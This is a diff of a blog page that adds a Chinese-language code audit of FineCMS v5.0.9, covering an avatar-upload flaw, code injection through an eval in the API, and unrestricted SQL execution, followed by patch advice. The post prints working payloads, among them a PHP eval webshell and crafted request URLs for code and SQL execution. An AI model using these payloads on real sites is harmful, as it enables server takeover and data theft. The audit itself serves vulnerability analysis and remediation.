@@ -6,14 +6,29 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives | MengChen&#39;s Blog</title>
+  <title>FineCMS v5.0.9 代码审计 | MengChen&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="MengChen&#39;s Blog">
-<meta property="og:url" content="http://yoursite.com/archives/index.html">
+  <meta name="description" content="FineCMS v5.0.9 任意文件上传&amp;amp;代码执行&amp;amp;SQL语句执行漏洞">
+<meta name="keywords" content="代码审计,SQL注入,命令执行">
+<meta property="og:type" content="article">
+<meta property="og:title" content="FineCMS v5.0.9 代码审计">
+<meta property="og:url" content="http://yoursite.com/2017/09/11/FineCMS-v5-0-9-代码审计/index.html">
 <meta property="og:site_name" content="MengChen&#39;s Blog">
+<meta property="og:description" content="FineCMS v5.0.9 任意文件上传&amp;amp;代码执行&amp;amp;SQL语句执行漏洞">
+<meta property="og:image" content="http://osn75zd5c.bkt.clouddn.com/fincms-5.0.9-2.png">
+<meta property="og:image" content="http://osn75zd5c.bkt.clouddn.com/fincms-5.0.9-3.png">
+<meta property="og:image" content="http://osn75zd5c.bkt.clouddn.com/fincms-5.0.9-4.png">
+<meta property="og:image" content="http://osn75zd5c.bkt.clouddn.com/fincms-5.0.9-1.png">
+<meta property="og:image" content="http://osn75zd5c.bkt.clouddn.com/fincms-5.0.9-5.png">
+<meta property="og:image" content="http://osn75zd5c.bkt.clouddn.com/fincms-5.0.9-6.png">
+<meta property="og:image" content="http://osn75zd5c.bkt.clouddn.com/fincms-5.0.9-7.png">
+<meta property="og:image" content="http://osn75zd5c.bkt.clouddn.com/fincms-5.0.9-8.png">
+<meta property="og:image" content="http://osn75zd5c.bkt.clouddn.com/fincms-5.0.9-9.png">
+<meta property="og:updated_time" content="2017-09-11T02:57:22.730Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="MengChen&#39;s Blog">
+<meta name="twitter:title" content="FineCMS v5.0.9 代码审计">
+<meta name="twitter:description" content="FineCMS v5.0.9 任意文件上传&amp;amp;代码执行&amp;amp;SQL语句执行漏洞">
+<meta name="twitter:image" content="http://osn75zd5c.bkt.clouddn.com/fincms-5.0.9-2.png">
   
     <link rel="alternative" href="/atom.xml" title="MengChen&#39;s Blog" type="application/atom+xml">
   
@@ -149,36 +164,401 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-FineCMS-v5-0-9-代码审计" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2017" class="archive-year">2017</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/09/11/FineCMS-v5-0-9-代码审计/" class="archive-article-date">
-  	<time datetime="2017-09-11T02:53:33.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-09-11</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/09/11/FineCMS-v5-0-9-代码审计/">FineCMS v5.0.9 代码审计</a>
+    <h1 class="article-title" itemprop="name">
+      FineCMS v5.0.9 代码审计
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2017/09/11/FineCMS-v5-0-9-代码审计/" class="archive-article-date">
+  	<time datetime="2017-09-11T02:53:33.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-09-11</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>FineCMS v5.0.9 任意文件上传&amp;代码执行&amp;SQL语句执行漏洞<br><a id="more"></a></p>
+<h2 id="0x01-任意文件上传漏洞演示-amp-剖析"><a href="#0x01-任意文件上传漏洞演示-amp-剖析" class="headerlink" title="0x01 任意文件上传漏洞演示&amp;剖析"></a>0x01 任意文件上传漏洞演示&amp;剖析</h2><p>概述： 在FineCMS v5.0.9版本中，会员中心中的上传头像模块存在任意文件上传漏洞</p>
+<h3 id="漏洞演示"><a href="#漏洞演示" class="headerlink" title="漏洞演示"></a>漏洞演示</h3><p>首先注册一个用户，进入到会员中心，上传一个名为”mengchen.jpeg”的图片马，文件内容为</p>
+<pre><code>&lt;?php phpinfo(); @eval($_POST[&apos;mengchen&apos;]);?&gt;
+</code></pre><p>上传时使用burpsuite抓包</p>
+<p><img src="http://osn75zd5c.bkt.clouddn.com/fincms-5.0.9-2.png" alt=""></p>
+<p>将tx参数中的jpeg改为php,直接提交</p>
+<p><img src="http://osn75zd5c.bkt.clouddn.com/fincms-5.0.9-3.png" alt=""></p>
+<p>这样文件就传上去了，而且还能执行</p>
+<p><img src="http://osn75zd5c.bkt.clouddn.com/fincms-5.0.9-4.png" alt=""></p>
+<h3 id="漏洞原理剖析"><a href="#漏洞原理剖析" class="headerlink" title="漏洞原理剖析"></a>漏洞原理剖析</h3><p>头像上传的函数在/finecms/dayrui/member/controllers/Account.php中的第177-214行</p>
+<pre><code>public function upload() {
+
+    // 创建图片存储文件夹
+    $dir = SYS_UPLOAD_PATH.&apos;/member/&apos;.$this-&gt;uid.&apos;/&apos;;
+    @dr_dir_delete($dir);
+    !is_dir($dir) &amp;&amp; dr_mkdirs($dir);
+
+    if ($_POST[&apos;tx&apos;]) {
+        $file = str_replace(&apos; &apos;, &apos;+&apos;, $_POST[&apos;tx&apos;]);//将空格替换为+号
+        if (preg_match(&apos;/^(data:\s*image\/(\w+);base64,)/&apos;, $file, $result)){
+            $new_file = $dir.&apos;0x0.&apos;.$result[2];
+            if (!@file_put_contents($new_file, base64_decode(str_replace($result[1], &apos;&apos;, $file)))) {
+                exit(dr_json(0, &apos;目录权限不足或磁盘已满&apos;));
+            } else {
+                $this-&gt;load-&gt;library(&apos;image_lib&apos;);
+                $config[&apos;create_thumb&apos;] = TRUE;
+                $config[&apos;thumb_marker&apos;] = &apos;&apos;;
+                $config[&apos;maintain_ratio&apos;] = FALSE;
+                $config[&apos;source_image&apos;] = $new_file;
+                foreach (array(30, 45, 90, 180) as $a) {
+                    $config[&apos;width&apos;] = $config[&apos;height&apos;] = $a;
+                    $config[&apos;new_image&apos;] = $dir.$a.&apos;x&apos;.$a.&apos;.&apos;.$result[2];
+                    $this-&gt;image_lib-&gt;initialize($config);
+                    if (!$this-&gt;image_lib-&gt;resize()) {
+                        exit(dr_json(0, &apos;上传错误：&apos;.$this-&gt;image_lib-&gt;display_errors()));
+                        break;
+                    }
+                }
+                list($width, $height, $type, $attr) = getimagesize($dir.&apos;45x45.&apos;.$result[2]);
+                !$type &amp;&amp; exit(dr_json(0, &apos;图片字符串不规范&apos;));
+            }
+        } else {
+
+            exit(dr_json(0, &apos;图片字符串不规范&apos;));
+        }
+    } else {
+        exit(dr_json(0, &apos;图片不存在&apos;));
+    }
+</code></pre><p>问题主要出现在第186行的那一句正则上</p>
+<pre><code>if (preg_match(&apos;/^(data:\s*image\/(\w+);base64,)/&apos;, $file, $result))
+</code></pre><p>在这里主要匹配的类似于”data:image/php;base64,”这种字符串，以”data:”开头，中间有”image/“,结尾有”;base64,”，但是”image/“和”;base64,”之间的字符串只要是任意数字和字母即可。</p>
+<p><img src="http://osn75zd5c.bkt.clouddn.com/fincms-5.0.9-1.png" alt=""></p>
+<p>最严重的是，开发者在这里将(\w+)匹配到的字符串作为了传入文件的扩展名</p>
+<pre><code>第187行 $new_file = $dir.&apos;0x0.&apos;.$result[2];
+</code></pre><p>然后文件就直接保存到服务器中了，在这之间没有任何的过滤，可以看一下测试代码</p>
+<p><img src="http://osn75zd5c.bkt.clouddn.com/fincms-5.0.9-5.png" alt=""></p>
+<p><img src="http://osn75zd5c.bkt.clouddn.com/fincms-5.0.9-6.png" alt=""></p>
+<p>至于路径中的uid，cookie中就有</p>
+<pre><code>$dir = SYS_UPLOAD_PATH.&apos;/member/&apos;.$this-&gt;uid.&apos;/&apos;;
+</code></pre><h2 id="0x02-代码执行漏洞演示-amp-剖析"><a href="#0x02-代码执行漏洞演示-amp-剖析" class="headerlink" title="0x02 代码执行漏洞演示&amp;剖析"></a>0x02 代码执行漏洞演示&amp;剖析</h2><h3 id="漏洞演示-1"><a href="#漏洞演示-1" class="headerlink" title="漏洞演示"></a>漏洞演示</h3><p>先放上payload</p>
+<pre><code>index.php?c=api&amp;m=data2&amp;auth=50ce0d2401ce4802751739552c8e4467&amp;param=action=cache name=MEMBER.1&apos;];phpinfo();$a=[&apos;1
+</code></pre><p>执行效果</p>
+<p><img src="http://osn75zd5c.bkt.clouddn.com/fincms-5.0.9-7.png" alt=""></p>
+<h3 id="漏洞原理剖析-1"><a href="#漏洞原理剖析-1" class="headerlink" title="漏洞原理剖析"></a>漏洞原理剖析</h3><p>这个漏洞在/finecms/dayrui/controllers/Api.php中的data2()函数中</p>
+<pre><code>public function data2() {
+
+    $data = array();
+
+    // 安全码认证
+    $auth = $this-&gt;input-&gt;get(&apos;auth&apos;, true);
+    if ($auth != md5(SYS_KEY)) {
+        // 授权认证码不正确
+        $data = array(&apos;msg&apos; =&gt; &apos;授权认证码不正确&apos;, &apos;code&apos; =&gt; 0);
+    } else {
+        // 解析数据
+        $cache = &apos;&apos;;
+        $param = $this-&gt;input-&gt;get(&apos;param&apos;);
+        if (isset($param[&apos;cache&apos;]) &amp;&amp; $param[&apos;cache&apos;]) {
+            $cache = md5(dr_array2string($param));
+            $data = $this-&gt;get_cache_data($cache);
+        }
+        if (!$data) {
+
+            // list数据查询
+            $data = $this-&gt;template-&gt;list_tag($param);
+            $data[&apos;code&apos;] = $data[&apos;error&apos;] ? 0 : 1;
+            unset($data[&apos;sql&apos;], $data[&apos;pages&apos;]);
+
+            // 缓存数据
+            $cache &amp;&amp; $this-&gt;set_cache_data($cache, $data, $param[&apos;cache&apos;]);
+        }
+    }
+
+    // 接收参数
+    $format = $this-&gt;input-&gt;get(&apos;format&apos;);
+    $function = $this-&gt;input-&gt;get(&apos;function&apos;);
+    if ($function) {
+        if (!function_exists($function)) {
+            $data = array(&apos;msg&apos; =&gt; fc_lang(&apos;自定义函数&apos;.$function.&apos;不存在&apos;), &apos;code&apos; =&gt; 0);
+        } else {
+            $data = $function($data);
+        }
+    }
+
+    // 页面输出
+    if ($format == &apos;php&apos;) {
+        print_r($data);
+    } elseif ($format == &apos;jsonp&apos;) {
+        // 自定义返回名称
+        echo $this-&gt;input-&gt;get(&apos;callback&apos;, TRUE).&apos;(&apos;.$this-&gt;callback_json($data).&apos;)&apos;;
+    } else {
+        // 自定义返回名称
+        echo $this-&gt;callback_json($data);
+    }
+    exit;
+}
+</code></pre><p>进入函数后，首先是安全码认证，这个在网站内部，但是很容易获得，就是cookie的名字的开头到第一个”_”处</p>
+<p><img src="http://osn75zd5c.bkt.clouddn.com/fincms-5.0.9-8.png" alt=""></p>
+<p>安全密钥在/config/system.php中第11行被定义</p>
+<pre><code>&apos;SYS_KEY&apos; =&gt; &apos;24b16fede9a67c9251d3e7c7161c83ac&apos;, //安全密钥
+</code></pre><p>然后在/finecms/dayrui/config/config.php中第37行将其设置成为cookie的名字</p>
+<pre><code>$config[&apos;sess_cookie_name&apos;] = $site[&apos;SYS_KEY&apos;].&apos;_ci_session&apos;;
+</code></pre><p>因此，直接在payload中使auth的值为SYS_KEY的MD5值即可。</p>
+<p>传入的param值不满足128行的条件</p>
+<pre><code>if (isset($param[&apos;cache&apos;]) &amp;&amp; $param[&apos;cache&apos;])
+</code></pre><p>因此$data依旧为空，$param直接传入list_tag()函数中</p>
+<pre><code>$data = $this-&gt;template-&gt;list_tag($param);
+</code></pre><p>定位一下list_tag()，在/finecms/dayrui/libraries/Template.php第402行</p>
+<p>传入的数据被处理成$params，一个数组</p>
+<pre><code>Array( 
+[0] =&gt; action=cache 
+[1] =&gt; name=member.1&apos;];phpinfo();$a=[&apos;1
+) 
+</code></pre><p>然后经过遍历处理，将两个值分别给了$system[‘action’]和$param[‘name’]</p>
+<pre><code>$system[&apos;action&apos;] = cache
+$param[&apos;name&apos;] = member.1&apos;];phpinfo();$a=[&apos;1
+</code></pre><p>然后在switch-case中，进入了</p>
+<pre><code>case &apos;cache&apos;: // 系统缓存数据
+    if (!isset($param[&apos;name&apos;])) {
+        return $this-&gt;_return($system[&apos;return&apos;], &apos;name参数不存在&apos;);
+    }
+    $pos = strpos($param[&apos;name&apos;], &apos;.&apos;);
+    if ($pos !== FALSE) {
+        $_name = substr($param[&apos;name&apos;], 0, $pos);
+        $_param = substr($param[&apos;name&apos;], $pos + 1);
+    } else {
+        $_name = $param[&apos;name&apos;];
+        $_param = NULL;
+    }
+    $cache = $this-&gt;_cache_var($_name, !$system[&apos;site&apos;] ? SITE_ID : $system[&apos;site&apos;]);
+    if (!$cache) {
+        return $this-&gt;_return($system[&apos;return&apos;], &quot;缓存({$_name})不存在，请在后台更新缓存&quot;);
+    }
+    if ($_param) {
+        $data = array();
+        @eval(&apos;$data=$cache&apos; . $this-&gt;_get_var($_param) . &apos;;&apos;);
+        if (!$data) {
+            return $this-&gt;_return($system[&apos;return&apos;], &quot;缓存({$_name})参数不存在!!&quot;);
+        }
+    } else {
+        $data = $cache;
+    }
+    return $this-&gt;_return($system[&apos;return&apos;], $data, &apos;&apos;);
+    break;
+</code></pre><p>代码执行的地方呢在第510行</p>
+<pre><code>@eval(&apos;$data=$cache&apos;.$this-&gt;_get_var($_param).&apos;;&apos;);
+</code></pre><p>要想将代码执行到这儿，必须使得503-506行</p>
+<pre><code>$cache = $this-&gt;_cache_var($_name, !$system[&apos;site&apos;] ? SITE_ID : $system[&apos;site&apos;]);
+
+if (!$cache) {
+return $this-&gt;_return($system[&apos;return&apos;], &quot;缓存({$_name})不存在，请在后台更新缓存&quot;);
+}
+</code></pre><p>的$cache有值，在这</p>
+<pre><code>$_name = member
+$_param = 1&apos;];phpinfo();$a=[&apos;1
+</code></pre><p>定位一下”_cache_var()”,在/finecms/dayrui/libraries/Template.php第1594-1619行</p>
+<pre><code>public function _cache_var($name, $site = SITE_ID) {
+    $data = NULL;
+    $name = strtoupper($name);
+    switch ($name) {
+        case &apos;MEMBER&apos;:
+            $data = $this-&gt;ci-&gt;get_cache(&apos;member&apos;);
+        break;
+        case &apos;URLRULE&apos;:
+            $data = $this-&gt;ci-&gt;get_cache(&apos;urlrule&apos;);
+        break;
+        case &apos;MODULE&apos;:
+            $data = $this-&gt;ci-&gt;get_cache(&apos;module&apos;);
+        break;
+        case &apos;CATEGORY&apos;:
+            $site = $site ? $site : SITE_ID;
+            $data = $this-&gt;ci-&gt;get_cache(&apos;category-&apos; . $site);
+        break;
+        default:
+            $data = $this-&gt;ci-&gt;get_cache($name . &apos;-&apos; . $site);
+        break;
+    }
+    return $data;
+}
+</code></pre><p>接着定位get_cache(),在/finecms/dayrui/core/M_Controller.php第362-402行。</p>
+<p>在其中，把传入的$name来读取本地文件缓存数据。因此只有传入”_cache_var()”的$name为</p>
+<pre><code>MEMBER、URLRULE、MODULE、CATEGORY
+</code></pre><p>中的任意一个才行，否则会引起报错。</p>
+<p>执行到这儿,在Template.php中的$_param存在，代码执行到了</p>
+<pre><code>@eval(&apos;$data=$cache&apos;.$this-&gt;_get_var($_param).&apos;;&apos;);
+</code></pre><p>中，定位一下”_get_var()函数”</p>
+<p>在/finecms/dayrui/libraries/Template.php第1570行</p>
+<pre><code>public function _get_var($param) {
+    $array = explode(&apos;.&apos;, $param);
+    if (!$array) {
+        return &apos;&apos;;
+    }
+    $string = &apos;&apos;;
+    foreach ($array as $var) {
+        $string.= &apos;[&apos;;
+        if (strpos($var, &apos;$&apos;) === 0) {
+            $string.= preg_replace(&apos;/\[(.+)\]/U&apos;, &apos;[\&apos;\\1\&apos;]&apos;, $var);
+        } elseif (preg_match(&apos;/[A-Z_]+/&apos;, $var)) {
+            $string.= &apos;&apos; . $var . &apos;&apos;;
+        } else {
+            $string.= &apos;\&apos;&apos; . $var . &apos;\&apos;&apos;;
+        }
+        $string.= &apos;]&apos;;
+    }
+    return $string;
+}
+</code></pre><p>在这个函数中，如果传入的参数$param的开头是一个$,</p>
+<pre><code>$string.= preg_replace(&apos;/\[(.+)\]/U&apos;, &apos;[\&apos;\\1\&apos;]&apos;, $var);
+</code></pre><p>这一条语句将会把所有的”[(任意字符)]”替换成”[‘1’]”,如果不是$开头但是字符串中有大写字母A-Z或者_,则会给字符串两边加上空格，要是条件都不满足呢，给两边都加一个单引号’,最后两边分别加上[],payload最终返回的$string为</p>
+<pre><code>[&apos;1&apos;];phpinfo();$asd=[&apos;1&apos;]
+</code></pre><p>然后eval语句就成了</p>
+<pre><code>@eval(﻿$data=$cache[&apos;1&apos;];phpinfo();$asd=[&apos;1&apos;];)
+</code></pre><p>代码成功执行</p>
+<h2 id="0x03-SQL语句执行漏洞演示-amp-剖析"><a href="#0x03-SQL语句执行漏洞演示-amp-剖析" class="headerlink" title="0x03 SQL语句执行漏洞演示&amp;剖析"></a>0x03 SQL语句执行漏洞演示&amp;剖析</h2><h3 id="漏洞演示-2"><a href="#漏洞演示-2" class="headerlink" title="漏洞演示"></a>漏洞演示</h3><p>payload:</p>
+<pre><code>index.php?c=api&amp;m=data2&amp;auth=50ce0d2401ce4802751739552c8e4467&amp;param=action=sql%20sql=&apos;select%20user();&apos;
+</code></pre><p>执行效果</p>
+<p><img src="http://osn75zd5c.bkt.clouddn.com/fincms-5.0.9-9.png" alt=""></p>
+<h3 id="漏洞原理剖析-2"><a href="#漏洞原理剖析-2" class="headerlink" title="漏洞原理剖析"></a>漏洞原理剖析</h3><p>与代码执行漏洞相似，传入的参数进入data2()函数，接着传入了/finecms/dayrui/libraries/Template.php中的list_tag()函数中，经过提取action后传入switch-case语句中的sql部分(732-795行)</p>
+<pre><code>case &apos;sql&apos;: // 直接sql查询
+    if (preg_match(&apos;/sql=\&apos;(.+)\&apos;/sU&apos;, $_params, $sql)) {
+        // 数据源的选择
+        $db = $this-&gt;ci-&gt;db;
+        // 替换前缀
+        $sql = str_replace(array(&apos;@#S&apos;, &apos;@#&apos;), array($db-&gt;dbprefix . $system[&apos;site&apos;], $db-&gt;dbprefix), trim(urldecode($sql[1])));
+        if (stripos($sql, &apos;SELECT&apos;) !== 0) {
+            return $this-&gt;_return($system[&apos;return&apos;], &apos;SQL语句只能是SELECT查询语句&apos;);
+        }
+        $total = 0;
+        $pages = &apos;&apos;;
+        // 如存在分页条件才进行分页查询
+        if ($system[&apos;page&apos;] &amp;&amp; $system[&apos;urlrule&apos;]) {
+            $page = max(1, (int)$_GET[&apos;page&apos;]);
+            $row = $this-&gt;_query(preg_replace(&apos;/select \* from/iUs&apos;, &apos;SELECT count(*) as c FROM&apos;, $sql), $system[&apos;site&apos;], $system[&apos;cache&apos;], FALSE);
+            $total = (int)$row[&apos;c&apos;];
+            $pagesize = $system[&apos;pagesize&apos;] ? $system[&apos;pagesize&apos;] : 10;
+            // 没有数据时返回空
+            if (!$total) {
+                return $this-&gt;_return($system[&apos;return&apos;], &apos;没有查询到内容&apos;, $sql, 0);
+            }
+            $sql.= &apos; LIMIT &apos; . $pagesize * ($page - 1) . &apos;,&apos; . $pagesize;
+            $pages = $this-&gt;_get_pagination(str_replace(&apos;[page]&apos;, &apos;{page}&apos;, urldecode($system[&apos;urlrule&apos;])), $pagesize, $total);
+        }
+        $data = $this-&gt;_query($sql, $system[&apos;site&apos;], $system[&apos;cache&apos;]);
+        $fields = NULL;
+        if ($system[&apos;module&apos;]) {
+            $fields = $this-&gt;ci-&gt;module[$system[&apos;module&apos;]][&apos;field&apos;]; // 模型主表的字段
+
+        }
+        if ($fields) {
+            // 缓存查询结果
+            $name = &apos;list-action-sql-&apos; . md5($sql);
+            $cache = $this-&gt;ci-&gt;get_cache_data($name);
+            if (!$cache &amp;&amp; is_array($data)) {
+                // 模型表的系统字段
+                $fields[&apos;inputtime&apos;] = array(&apos;fieldtype&apos; =&gt; &apos;Date&apos;);
+                $fields[&apos;updatetime&apos;] = array(&apos;fieldtype&apos; =&gt; &apos;Date&apos;);
+                // 格式化显示自定义字段内容
+                foreach ($data as $i =&gt; $t) {
+                    $data[$i] = $this-&gt;ci-&gt;field_format_value($fields, $t, 1);
+                }
+                //$cache = $this-&gt;ci-&gt;set_cache_data($name, $data, $system[&apos;cache&apos;]);
+                $cache = $system[&apos;cache&apos;] ? $this-&gt;ci-&gt;set_cache_data($name, $data, $system[&apos;cache&apos;]) : $data;
+            }
+            $data = $cache;
+        }
+        return $this-&gt;_return($system[&apos;return&apos;], $data, $sql, $total, $pages, $pagesize);
+    } else {
+        return $this-&gt;_return($system[&apos;return&apos;], &apos;参数不正确，SQL语句必须用单引号包起来&apos;); // 没有查询到内容
+
+    }
+    break;
+</code></pre><p>使用一个简单的正则将sql语句从传入的变量$_params中提取出来，$sql的内容变成了单引号之内的，也就是</p>
+<pre><code>select user();
+</code></pre><p>此时$system为</p>
+<pre><code>﻿Array (
+[oot] =&gt; 
+[num] =&gt; 
+[form] =&gt; 
+[page] =&gt; 
+[site] =&gt; 1 
+[flag] =&gt; 
+[more] =&gt; 
+[catid] =&gt; 
+[field] =&gt; 
+[order] =&gt; 
+[space] =&gt; 
+[table] =&gt; 
+[join] =&gt; 
+[on] =&gt; 
+[cache] =&gt; 1110 
+[action] =&gt; sql 
+[return] =&gt; 
+[sbpage] =&gt; 
+[module] =&gt; 
+[modelid] =&gt; 
+[keyword] =&gt; 
+[urlrule] =&gt; 
+[pagesize] =&gt; 
+) 
+</code></pre><p>然后sql语句只是简单的判断了下是否为select开头(746-748行)</p>
+<pre><code>    if (stripos($sql, &apos;SELECT&apos;) !== 0) {
+return $this-&gt;_return($system[&apos;return&apos;], &apos;SQL语句只能是SELECT查询语句&apos;);
+}
+</code></pre><p>然后就进入了767行，数据查询函数中</p>
+<pre><code>$data = $this-&gt;_query($sql, $system[&apos;site&apos;], $system[&apos;cache&apos;]);
+</code></pre><p>定位一下”_query()”函数，在Template.php文件的1319-1346行，</p>
+<pre><code>public function _query($sql, $site, $cache, $all = TRUE) {
+
+    // 数据库对象
+    $db = $site ? $this-&gt;ci-&gt;site[$site] : $this-&gt;ci-&gt;db;
+    $cname = md5($sql.dr_now_url());
+    // 缓存存在时读取缓存文件
+    if ($cache &amp;&amp; $data = $this-&gt;ci-&gt;get_cache_data($cname)) {
+        return $data;
+    }
+
+    // 执行SQL
+    $db-&gt;db_debug = FALSE;
+    $query = $db-&gt;query($sql);
+
+    if (!$query) {
+        return &apos;SQL查询解析不正确：&apos;.$sql;
+    }
+
+    // 查询结果
+    $data = $all ? $query-&gt;result_array() : $query-&gt;row_array();
+
+    // 开启缓存时，重新存储缓存数据
+    $cache &amp;&amp; $this-&gt;ci-&gt;set_cache_data($cname, $data, $cache);
+
+    $db-&gt;db_debug = TRUE;
+
+    return $data;
+}
+</code></pre><p>可以看到$sql直接进入了系统函数进行了数据查询。</p>
+<h2 id="0x04-漏洞修补方案"><a href="#0x04-漏洞修补方案" class="headerlink" title="0x04 漏洞修补方案"></a>0x04 漏洞修补方案</h2><h3 id="1-文件上传漏洞的修补方案"><a href="#1-文件上传漏洞的修补方案" class="headerlink" title="1. 文件上传漏洞的修补方案"></a>1. 文件上传漏洞的修补方案</h3><p>漏洞产生的主要原因是因为开发者将获取的新文件的扩展名没有添加任何验证就将其拼接到了文件名称上，可以添加一个白名单验证。只允许允许上传的文件类型的扩展名上传。</p>
+<h3 id="2-代码执行和sql语句执行漏洞的修补方案"><a href="#2-代码执行和sql语句执行漏洞的修补方案" class="headerlink" title="2. 代码执行和sql语句执行漏洞的修补方案"></a>2. 代码执行和sql语句执行漏洞的修补方案</h3><p>看这两个漏洞呢，都出现在Api.php的data2()函数中，其中的安全措施——安全码认证很容易就能获得，如果不能获得的话，那么这个漏洞后续的操作就不会被触发，我觉得可以修改cookie等需要调用安全码认证的地方，只让其获取一部分。或者让安全码不会被用户看到，验证阶段对于用户来说是一个黑箱子。</p>
+<h3 id="3-对比5-0-11版本，查看官方解决方案"><a href="#3-对比5-0-11版本，查看官方解决方案" class="headerlink" title="3. 对比5.0.11版本，查看官方解决方案"></a>3. 对比5.0.11版本，查看官方解决方案</h3><p>5.0.11版本中</p>
+<pre><code>if (!in_array(strtolower($result[2]), array(&apos;jpg&apos;, &apos;jpeg&apos;, &apos;png&apos;, &apos;gif&apos;))) {
+        exit(dr_json(0, &apos;目录权限不足&apos;));
+    }
+</code></pre><p>加入了白名单</p>
+<p>在5.0.11版本的finecms\dayrui\config\config.php文件中</p>
+<pre><code>$config[&apos;sess_cookie_name&apos;]    = md5(substr($site[&apos;SYS_KEY&apos;],0, 5)).&apos;_ci_session&apos;;
+</code></pre><p>相比较5.0.9版本直接获取SYS_KEY的值更安全了</p>
+<pre><code>$config[&apos;sess_cookie_name&apos;]    = $site[&apos;SYS_KEY&apos;].&apos;_ci_session&apos;;
+</code></pre>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -198,210 +578,119 @@
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="http://s.jiathis.com/qrcode.php?url=http://yoursite.com/2017/09/11/FineCMS-v5-0-9-代码审计/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/09/10/火种CTF总结/" class="archive-article-date">
-  	<time datetime="2017-09-10T08:19:51.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-09-10</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2017/09/10/火种CTF总结/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">火种CTF总结</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/09/10/火种CTF总结/">火种CTF总结</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
